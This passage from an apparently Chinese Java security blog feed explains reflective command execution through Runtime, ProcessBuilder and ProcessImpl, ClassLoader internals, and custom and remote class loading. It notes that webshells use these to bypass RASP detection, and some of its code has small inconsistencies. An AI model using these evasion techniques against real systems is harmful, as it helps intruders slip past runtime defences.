java">Class rt = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method exec = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>Method getRuntime = rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-comment">//Object newinstance = getRuntime.invoke(rt);</span><br>Object newinstance = getRuntime.invoke(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>Process p = (Process) exec.invoke(newinstance, <span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个<code>getMethod</code>获取<code>exec</code>方法时候，为什么有<code>String.class</code>这个参数？</p><p>其实是因为<code>exec</code>方法有重载，我们在指定哪个重载函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220616173228988.png"></p><h4 id="ProcessBuilder-1"><a href="#ProcessBuilder-1" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h4><p>这个类有两个构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProcessBuilder</span><span class="hljs-params">(List&lt;String&gt; command)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProcessBuilder</span><span class="hljs-params">(String... command)</span></span><br></code></pre></td></tr></table></figure><ul><li>泛型参数</li></ul><p><code>List&lt;String&gt;</code>，元素为 String 类型的链表集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>        List&lt;String&gt; list= <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        list.add(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        Constructor constructor = pb.getDeclaredConstructor(List.class);<br>        Object newInstance = constructor.newInstance(list);<br>        Method start = pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>);<br>        Process process = (Process) start.invoke(newInstance);<br><br>        InputStream is = p.getInputStream();<br>        InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>        StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>        String line = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            sb.append(line);<br>            System.out.println(line);<br>        &#125;<br>        br.close();<br>        isr.close();<br>        is.close();<br></code></pre></td></tr></table></figure><p><code>List.add和Arrays.asList傻傻分不清</code>另一种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.List;<br><br>Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p = (Process) pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(pb.getDeclaredConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;calc&quot;</span>)));<br></code></pre></td></tr></table></figure><p>强调一下，用的是<code>java.util.List</code></p><ul><li>可变参数的构造方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p =((ProcessBuilder)pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;)).start();<br></code></pre></td></tr></table></figure><blockquote><p>Exception in thread “main” java.lang.IllegalArgumentException: argument type mismatch</p></blockquote><p>但是这样会报错，不合法的参数</p><p>原因是这里要传入的是二维数组，可以在上面那个方法调试得知</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p =((ProcessBuilder)pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;&#125;)).start();<br><br><span class="hljs-comment">//start也通过反射获取，需要注意start方法通过反射获得的话，类型强制转换应为Process</span><br>Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p = (Process) pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;&#125;));<br></code></pre></td></tr></table></figure><h4 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] cmd = &#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,<span class="hljs-string">&quot;whoami&quot;</span>&#125;;<br>Class pi = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>Method start = pi.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-keyword">boolean</span>.class);<br>start.setAccessible(<span class="hljs-keyword">true</span>);<br>Process pc = (Process) start.invoke(pi, cmd,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>);<br>InputStream is = pc.getInputStream();<br>InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>String line = <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>    sb.append(line);<br>    System.out.println(line);<br>&#125;<br>br.close();<br>isr.close();<br>is.close();<br></code></pre></td></tr></table></figure><p>这里与上层的<code>Runtime</code>反射产生联想，为什么没有获取构造方法，然后使用调用<code>newInstance</code>获取实例</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ClassLoader</title>
    <link href="/2022/03/05/ClassLoader/"/>
    <url>/2022/03/05/ClassLoader/</url>
    
    <content type="html"><![CDATA[<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="1-类加载机制"><a href="#1-类加载机制" class="headerlink" title="1. 类加载机制"></a>1. 类加载机制</h2><p>Java依赖于<code>JVM</code>(Java虚拟机)实现的跨平台开发语言，程序运行前需要先编译成字节码文件<code>.class</code></p><p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code></p><p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code></p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;hello world&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ClassLoader</code>类加载流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>Demo</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>Demo</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>Demo</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>Demo</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>Demo</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>Demo</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/JvmSpec7.png"></p><h2 id="2-Java类"><a href="#2-Java类" class="headerlink" title="2. Java类"></a>2. Java类</h2><p>一个Java类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moonlight</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JDK自带的<code>javap</code>反编译Moonlight.class</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232052427.png"></p><p><code>hexdump</code>查看二进制字节码文件Moonlight.class</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232133753.png"></p><h2 id="3-类的动态加载"><a href="#3-类的动态加载" class="headerlink" title="3. 类的动态加载"></a>3. 类的动态加载</h2><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>，显式通常由<code>Java反射</code>或<code>ClassLoader</code>动态加载类对象，隐式指的是<code>类.方法()</code>或<code>new</code>一个类实例</p><p>所以有两种方式去动态加载类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射加载Moonlight实例</span><br>Class.forName(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br><br><span class="hljs-comment">//ClassLoader加载Moonlight实例</span><br><span class="hljs-keyword">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>forName(String className)</p><p>forName(String name,boolean initialize,ClassLoader loader)</p></blockquote><p>其中<code>Class.forName(&quot;类&quot;)</code>默认会初始化被加载类的静态属性和方法，重载方法可以设置不初始化类；<code>ClassLoader.loadClass</code>默认不会初始化类方法</p><h2 id="4-自定义ClassLoader"><a href="#4-自定义ClassLoader" class="headerlink" title="4. 自定义ClassLoader"></a>4. 自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><p>如果存在类Moonlight，调用其一个方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220307192239106.png"></p><p>但是类Moonlight不存在于<code>classpath</code>，我们可以自定义类加载器重写<code>findClass</code>方法，然后调用<code>defineClass</code>方法时<strong>传入类Moonlight的字节码向<code>JVM</code>中定义一个类Moonlight类</strong>，最后通过反射调用类Moonlight的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br><br>    <span class="hljs-comment">// 类名</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String testClassName = <span class="hljs-string">&quot;Moonlight&quot;</span>;<br><br>    <span class="hljs-comment">// 类字节码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] testClassBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<br>            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">19</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">126</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">47</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">47</span>,<br>            <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>,<br>            <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span><br>    &#125;;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 只处理Moonlight类</span><br>        <span class="hljs-keyword">if</span> (name.equals(testClassName)) &#123;<br>            <span class="hljs-comment">// 调用JVM的native方法定义Moonlight类</span><br>            <span class="hljs-keyword">return</span> defineClass(testClassName, testClassBytes, <span class="hljs-number">0</span>, testClassBytes.length);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.findClass(name);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// 创建自定义的类加载器</span><br>        Demo2 loader = <span class="hljs-keyword">new</span> Demo2();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用自定义的类加载器加载Moonlight类</span><br>            Class testClass = loader.loadClass(testClassName);<br><br>            <span class="hljs-comment">// 反射创建类</span><br>            Object testInstance = testClass.newInstance();<br><br>            <span class="hljs-comment">// 反射获取osname方法</span><br>            Method method = testInstance.getClass().getMethod(<span class="hljs-string">&quot;osname&quot;</span>);<br><br>            <span class="hljs-comment">// 反射调用osname方法</span><br>            String str = (String) method.invoke(testInstance);<br><br>            System.out.println(str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义类加载器可以在webshell实现加载并调用自己编译的类对象，比如可以命令执行时调用自定义类字节码的native方法绕过RASP检测</p><p>初学存疑：类字节码如何获取<a href="https://blog.csdn.net/generalfu/article/details/112003104">https://blog.csdn.net/generalfu/article/details/112003104</a></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>继承ClassLoader的URLClassLoader可以加载远程jar实现类方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.anbai.sec.classloader;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestURLClassLoader</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> 